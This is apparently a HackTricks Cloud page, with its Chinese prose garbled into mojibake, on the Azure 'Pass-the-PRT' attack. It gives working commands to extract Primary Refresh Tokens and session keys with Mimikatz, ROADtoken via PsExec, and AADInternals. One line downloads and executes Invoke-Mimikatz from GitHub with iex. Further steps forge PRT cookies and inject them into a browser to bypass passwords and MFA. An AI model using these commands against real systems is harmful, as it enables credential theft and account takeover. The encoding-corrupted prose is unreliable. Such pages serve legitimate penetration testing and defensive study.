# Az - ä¼ é€’PRT

<details>

<summary><strong>æ”¯æŒHackTrickså¹¶è·å¾—ç¦åˆ©ï¼</strong></summary>

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Šï¼Œæˆ–è€…å¦‚æœæ‚¨æƒ³è®¿é—®PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFç‰ˆæœ¬çš„HackTricksï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFT**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„è´¦å· ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) **å’Œ** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## ä»€ä¹ˆæ˜¯PRT

**ä¸»è¦åˆ·æ–°ä»¤ç‰Œï¼ˆPRTï¼‰**ç”¨äºä¸ºWindows 10å’Œç§»åŠ¨æ“ä½œç³»ç»Ÿçš„ç”¨æˆ·æä¾›**å•ä¸€ç™»å½•ï¼ˆSSOï¼‰**ä½“éªŒã€‚

å½“æ‚¨åœ¨æ”¯æŒæ­¤SSOçš„è®¾å¤‡ä¸Šç™»å½•æ—¶ï¼ŒWindowså°†ä¸äº‘èº«ä»½éªŒè¯æä¾›ç¨‹åºè¿›è¡Œé€šä¿¡ï¼ŒéªŒè¯æ‚¨çš„å‡­æ®ï¼Œå¹¶è¿”å›**PRT**å’Œ**ä¼šè¯å¯†é’¥**ã€‚**PRTå­˜å‚¨åœ¨LSASSä¸­**ï¼Œè€Œ**ä¼šè¯å¯†é’¥ä¼šè¢«é‡æ–°åŠ å¯†**ï¼Œç„¶åä¸PRTä¸€èµ·å­˜å‚¨åœ¨æœ¬åœ°è®¾å¤‡çš„TPMä¸­ã€‚

ç„¶åï¼Œå½“**æµè§ˆå™¨**å°è¯•è®¿é—®äº‘ä¸Šçš„èµ„æºæ—¶ï¼Œä¼šä½¿ç”¨**PRT cookie**æ¥è®¿é—®å®ƒä»¬ã€‚

ä¸€æ—¦å‘è¡Œï¼Œ**PRT**åœ¨**14å¤©**å†…æœ‰æ•ˆï¼Œå¹¶ä¸”åªè¦ç”¨æˆ·ä¸»åŠ¨ä½¿ç”¨è®¾å¤‡ï¼Œå°±ä¼š**æŒç»­æ›´æ–°**ã€‚åªæœ‰åœ¨è®¿é—®RDPæ—¶ä½¿ç”¨**Windows Hello**æˆ–**Windowsè´¦æˆ·ç®¡ç†å™¨**æ—¶ï¼ŒPRTæ‰å…·æœ‰**MFAå£°æ˜**ã€‚

å®ƒå¯ä»¥ç”¨äºè·å–ä»»ä½•åº”ç”¨ç¨‹åºçš„è®¿é—®å’Œåˆ·æ–°ä»¤ç‰Œã€‚

æœ‰å…³æ­¤å·¥ä½œåŸç†çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·é˜…è¯»[**æ–‡æ¡£**](https://docs.microsoft.com/en-us/azure/active-directory/devices/concept-primary-refresh-token)æˆ–[**æ­¤é¡µé¢**](https://stealthbits.com/blog/lateral-movement-to-the-cloud-pass-the-prt/)ã€‚

### æ£€æŸ¥æ˜¯å¦æœ‰PRT
```
Dsregcmd.exe /status
```
åœ¨SSOçŠ¶æ€éƒ¨åˆ†ï¼Œæ‚¨åº”è¯¥çœ‹åˆ°**`AzureAdPrt`**è®¾ç½®ä¸º**YES**ã€‚

<figure><img src="../../../.gitbook/assets/image (10) (3).png" alt=""><figcaption></figcaption></figure>

åœ¨åŒä¸€è¾“å‡ºä¸­ï¼Œæ‚¨è¿˜å¯ä»¥æŸ¥çœ‹è®¾å¤‡æ˜¯å¦å·²åŠ å…¥Azureï¼ˆåœ¨å­—æ®µ`AzureAdJoined`ä¸­ï¼‰ï¼š

<figure><img src="../../../.gitbook/assets/image (10) (2).png" alt=""><figcaption></figcaption></figure>

## Pass-the-PRT

### æ­¥éª¤

1. **ä»LSASSä¸­æå–**PRTå¹¶ä¿å­˜ä»¥å¤‡åç”¨ã€‚
2. **æå–**ä¼šè¯å¯†é’¥ã€‚å¦‚æœæ‚¨è®°å¾—ï¼Œè¿™æ˜¯ç”±æœ¬åœ°è®¾å¤‡å‘å‡ºå¹¶é‡æ–°åŠ å¯†çš„ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ä½¿ç”¨DPAPIä¸»å¯†é’¥**è§£å¯†æ­¤å¯†é’¥**ã€‚æœ‰å…³DPAPIçš„æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹æ­¤[**HackTricks**](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords)é“¾æ¥æˆ–[**Pass-the-cookie attack**](az-pass-the-cookie.md)ã€‚
3. ä½¿ç”¨è§£å¯†çš„ä¼šè¯å¯†é’¥ï¼Œæˆ‘ä»¬å°†è·å¾—PRTå’Œä¸Šä¸‹æ–‡çš„æ´¾ç”Ÿå¯†é’¥ã€‚è¿™æ˜¯åˆ›å»ºæˆ‘ä»¬çš„PRT cookieæ‰€éœ€çš„ã€‚æ´¾ç”Ÿå¯†é’¥ç”¨äºä¸ºcookieç­¾åJWTã€‚Dirk-janåœ¨[è¿™é‡Œ](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/)å¯¹è¿™ä¸ªè¿‡ç¨‹è¿›è¡Œäº†å¾ˆå¥½çš„è§£é‡Šã€‚

ç°åœ¨æˆ‘ä»¬æ‹¥æœ‰äº†ç­¾ç½²è‡ªå·±çš„PRT Cookiesæ‰€éœ€çš„ä¸€åˆ‡ï¼Œå…¶ä½™æ­¥éª¤å¯ä»¥åœ¨ä»»ä½•å…¶ä»–ç³»ç»Ÿä¸Šå®Œæˆã€‚

* æˆ‘ä»¬å°†ä½¿ç”¨PRTã€æ´¾ç”Ÿå¯†é’¥å’Œä¸Šä¸‹æ–‡æ¥åˆ›å»ºæ–°çš„PRT Cookieã€‚
* å°†Cookieå¯¼å…¥åˆ°æ‚¨çš„æµè§ˆå™¨ä¼šè¯ä¸­ï¼ˆæˆ‘ä»¬å°†ä½¿ç”¨Chromeï¼‰
* å°±è¿™æ ·ï¼æ‚¨ç°åœ¨åº”è¯¥å·²ç»é€šè¿‡èº«ä»½éªŒè¯ï¼Œè€Œæ— éœ€çŸ¥é“å…¶å¯†ç æˆ–å¤„ç†ä»»ä½•MFAæç¤ºã€‚

### æ”»å‡» - Roadtoken

æœ‰å…³æ­¤æ–¹æ³•çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·[**æŸ¥çœ‹æ­¤æ–‡ç« **](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/)ã€‚è¦ç”Ÿæˆæœ‰æ•ˆçš„PRT cookieï¼Œæ‚¨é¦–å…ˆéœ€è¦ä¸€ä¸ªnonceã€‚\
æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹å¼è·å–ï¼š
```powershell
$TenantId = "19a03645-a17b-129e-a8eb-109ea7644bed"
$URL = "https://login.microsoftonline.com/$TenantId/oauth2/token"

$Params = @{
"URI"     = $URL
"Method"  = "POST"
}
$Body = @{
"grant_type" = "srv_challenge"
}
$Result = Invoke-RestMethod @Params -UseBasicParsing -Body $Body
$Result.Nonce
AwABAAAAAAACAOz_BAD0_8vU8dH9Bb0ciqF_haudN2OkDdyluIE2zHStmEQdUVbiSUaQi_EdsWfi1 9-EKrlyme4TaOHIBG24v-FBV96nHNMgAA
```
æˆ–è€…ä½¿ç”¨[**roadrecon**](https://github.com/dirkjanm/ROADtools)ï¼š
```powershell
roadrecon auth prt-init
```
ç„¶åä½ å¯ä»¥ä½¿ç”¨[**roadtoken**](https://github.com/dirkjanm/ROADtoken)æ¥è·å–ä¸€ä¸ªæ–°çš„PRTï¼ˆåœ¨å·¥å…·ä¸­è¿è¡Œç”¨æˆ·è¿›ç¨‹è¿›è¡Œæ”»å‡»ï¼‰ï¼š
```powershell
.\ROADtoken.exe <nonce>
```
ä½œä¸ºä¸€è¡Œä»£ç ï¼š 

{% code overflow="wrap" %}
```powershell
Invoke-Command - Session $ps_sess -ScriptBlock{C:\Users\Public\PsExec64.exe - accepteula -s "cmd.exe" " /c C:\Users\Public\SessionExecCommand.exe UserToImpersonate C:\Users\Public\ROADToken.exe AwABAAAAAAACAOz_BAD0__kdshsy61GF75SGhs_[...] > C:\Users\Public\PRT.txt"}
```
{% endcode %}

ç„¶åï¼Œæ‚¨å¯ä»¥ä½¿ç”¨**ç”Ÿæˆçš„ cookie**æ¥**ç”Ÿæˆä»¤ç‰Œ**ï¼Œä»¥ä½¿ç”¨ Azure AD **Graph** æˆ– Microsoft Graph è¿›è¡Œ**ç™»å½•**ï¼š
```powershell
roadrecon auth --prt-cookie <prt_cookie>

Connect-AzureAD --AadAccessToken <token> --IaccountId <acc_ind>
```
### æ”»å‡» - ä½¿ç”¨AADInternals

`Get-AADIntUserPRTToken` ä» Azure AD åŠ å…¥æˆ–æ··åˆåŠ å…¥çš„è®¡ç®—æœºä¸­è·å–ç”¨æˆ·çš„ PRT ä»¤ç‰Œã€‚ä½¿ç”¨ `BrowserCore.exe` è·å– PRT ä»¤ç‰Œã€‚
```powershell
# Get the PRToken
$prtToken = Get-AADIntUserPRTToken

# Get an access token for AAD Graph API and save to cache
Get-AADIntAccessTokenForAADGraph -PRTToken $prtToken
```
æˆ–è€…ï¼Œå¦‚æœæ‚¨æ‹¥æœ‰Mimikatzçš„å€¼ï¼Œæ‚¨ä¹Ÿå¯ä»¥ä½¿ç”¨AADInternalsç”Ÿæˆä¸€ä¸ªä»¤ç‰Œï¼š
```powershell
# Mimikat "PRT" value
$MimikatzPRT="MC5BWU..."

# Add padding
while($MimikatzPrt.Length % 4) {$MimikatzPrt += "="}

# Decode
$PRT=[text.encoding]::UTF8.GetString([convert]::FromBase64String($MimikatzPRT))

# Mimikatz "Clear key" value
$MimikatzClearKey="37c5ecdfeab49139288d8e7b0732a5c43fac53d3d36ca5629babf4ba5f1562f0"

# Convert to Byte array and B64 encode
$SKey = [convert]::ToBase64String( [byte[]] ($MimikatzClearKey -replace '..', '0x$&,' -split ',' -ne ''))

# Generate PRTToken with Nonce
$prtToken = New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey -GetNonce
$prtToken
## You can already use this token ac cookie in the browser

# Get access token from prtToken
$AT = Get-AADIntAccessTokenForAzureCoreManagement -PRTToken $prtToken

# Verify access and connect with Az. You can see account id in mimikatz prt output
Connect-AzAccount -AccessToken $AT -TenantID <tenant-id> -AccountId <acc-id>
```
å‰å¾€[https://login.microsoftonline.com](https://login.microsoftonline.com)ï¼Œæ¸…é™¤æ‰€æœ‰login.microsoftonline.comçš„cookiesï¼Œå¹¶è¾“å…¥ä¸€ä¸ªæ–°çš„cookieã€‚
```
Name: x-ms-RefreshTokenCredential
Value: [Paste your output from above]
Path: /
HttpOnly: Set to True (checked)
```
ç„¶åè½¬åˆ°[https://portal.azure.com](https://portal.azure.com)&#x20;

{% hint style="danger" %}
å…¶ä½™éƒ¨åˆ†åº”è¯¥æ˜¯é»˜è®¤çš„ã€‚ç¡®ä¿æ‚¨å¯ä»¥åˆ·æ–°é¡µé¢å¹¶ä¸”cookieä¸ä¼šæ¶ˆå¤±ï¼Œå¦‚æœæ¶ˆå¤±äº†ï¼Œå¯èƒ½æ˜¯æ‚¨çŠ¯äº†ä¸€ä¸ªé”™è¯¯ï¼Œéœ€è¦é‡æ–°è¿›è¡Œè¯¥è¿‡ç¨‹ã€‚å¦‚æœæ²¡æœ‰æ¶ˆå¤±ï¼Œé‚£å°±æ²¡é—®é¢˜äº†ã€‚
{% endhint %}

### æ”»å‡» - Mimikatz

{% hint style="warning" %}
è‡ª2021å¹´8æœˆä¿®å¤ä»¥æ¥ï¼Œæ— æ³•ä½¿ç”¨æ­¤æ–¹æ³•è·å–å…¶ä»–ç”¨æˆ·çš„PRTä»¤ç‰Œï¼Œå› ä¸ºåªæœ‰ç”¨æˆ·å¯ä»¥è·å–è‡ªå·±çš„PRTï¼ˆæœ¬åœ°ç®¡ç†å‘˜æ— æ³•è®¿é—®å…¶ä»–ç”¨æˆ·çš„PRTï¼‰ï¼Œä½†å¯ä»¥è®¿é—®è‡ªå·±çš„PRTã€‚
{% endhint %}

{% hint style="danger" %}
**ä¸Šæ¬¡æˆ‘å°è¯•ç”Ÿæˆcookieçš„æ–¹æ³•æ²¡æœ‰æˆåŠŸ**
{% endhint %}

æ‚¨å¯ä»¥ä½¿ç”¨**mimikatz**æ¥æå–PRTï¼š
```powershell
mimikatz.exe
Privilege::debug
Sekurlsa::cloudap

# Or in powershell
iex (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1")
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap"'
```
<figure><img src="../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

**å¤åˆ¶**æ ‡è®°ä¸º**Prt**çš„éƒ¨åˆ†å¹¶ä¿å­˜ã€‚\
è¿˜è¦æå–ä¼šè¯å¯†é’¥æˆ–â€œ**ProofOfPosessionKey**â€ï¼Œæ‚¨å¯ä»¥åœ¨ä¸‹é¢çš„é«˜äº®éƒ¨åˆ†çœ‹åˆ°ã€‚è¿™æ˜¯åŠ å¯†çš„ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨DPAPIä¸»å¯†é’¥æ¥è§£å¯†å®ƒã€‚

<figure><img src="../../../.gitbook/assets/image (11) (2).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
å¦‚æœæ‚¨æ²¡æœ‰çœ‹åˆ°ä»»ä½•PRTæ•°æ®ï¼Œå¯èƒ½æ˜¯å› ä¸ºæ‚¨çš„è®¾å¤‡æ²¡æœ‰åŠ å…¥Azure ADï¼Œæˆ–è€…æ‚¨æ­£åœ¨è¿è¡Œæ—§ç‰ˆæœ¬çš„Windows 10ã€‚
{% endhint %}

è¦è§£å¯†ä¼šè¯å¯†é’¥ï¼Œæ‚¨éœ€è¦æå‡æƒé™åˆ°**SYSTEM**ä»¥åœ¨è®¡ç®—æœºä¸Šä¸‹æ–‡ä¸­è¿è¡Œï¼Œä»¥ä¾¿èƒ½å¤Ÿä½¿ç”¨**DPAPIä¸»å¯†é’¥æ¥è§£å¯†å®ƒ**ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥æ‰§è¡Œæ­¤æ“ä½œï¼š
```
token::elevate
dpapi::cloudapkd /keyvalue:[PASTE ProofOfPosessionKey HERE] /unprotect
```
<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

ç°åœ¨ä½ æƒ³è¦å¤åˆ¶Contextå€¼ï¼š

<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

ä»¥åŠæ´¾ç”Ÿå¯†é’¥å€¼ï¼š

<figure><img src="../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

æœ€åï¼Œä½ å¯ä»¥ä½¿ç”¨æ‰€æœ‰è¿™äº›ä¿¡æ¯æ¥**ç”ŸæˆPRT cookies**ï¼š
```
Dpapi::cloudapkd /context:[CONTEXT] /derivedkey:[DerivedKey] /Prt:[PRT]
```
<figure><img src="../../../.gitbook/assets/image (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

å‰å¾€[https://login.microsoftonline.com](https://login.microsoftonline.com)ï¼Œæ¸…é™¤æ‰€æœ‰login.microsoftonline.comçš„cookieå¹¶è¾“å…¥æ–°çš„cookieã€‚
```
Name: x-ms-RefreshTokenCredential
Value: [Paste your output from above]
Path: /
HttpOnly: Set to True (checked)
```
ç„¶åè½¬åˆ°[https://portal.azure.com](https://portal.azure.com)&#x20;

{% hint style="danger" %}
å…¶ä½™éƒ¨åˆ†åº”è¯¥æ˜¯é»˜è®¤çš„ã€‚ç¡®ä¿æ‚¨å¯ä»¥åˆ·æ–°é¡µé¢å¹¶ä¸”cookieä¸ä¼šæ¶ˆå¤±ï¼Œå¦‚æœæ¶ˆå¤±äº†ï¼Œå¯èƒ½æ˜¯æ‚¨çŠ¯äº†ä¸€ä¸ªé”™è¯¯ï¼Œå¿…é¡»é‡æ–°è¿›è¡Œè¯¥è¿‡ç¨‹ã€‚å¦‚æœæ²¡æœ‰æ¶ˆå¤±ï¼Œé‚£å°±æ²¡é—®é¢˜äº†ã€‚
{% endhint %}

## å‚è€ƒèµ„æ–™

* æœ¬æ–‡ä¸»è¦æ‘˜è‡ª[https://stealthbits.com/blog/lateral-movement-to-the-cloud-pass-the-prt/](https://stealthbits.com/blog/lateral-movement-to-the-cloud-pass-the-prt/)

<details>

<summary><strong>æ”¯æŒHackTrickså¹¶è·å¾—ç¦åˆ©ï¼</strong></summary>

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Šï¼Œæˆ–è€…å¦‚æœæ‚¨æƒ³è®¿é—®PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricksï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFT**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„è´¦å· ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) **å’Œ** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
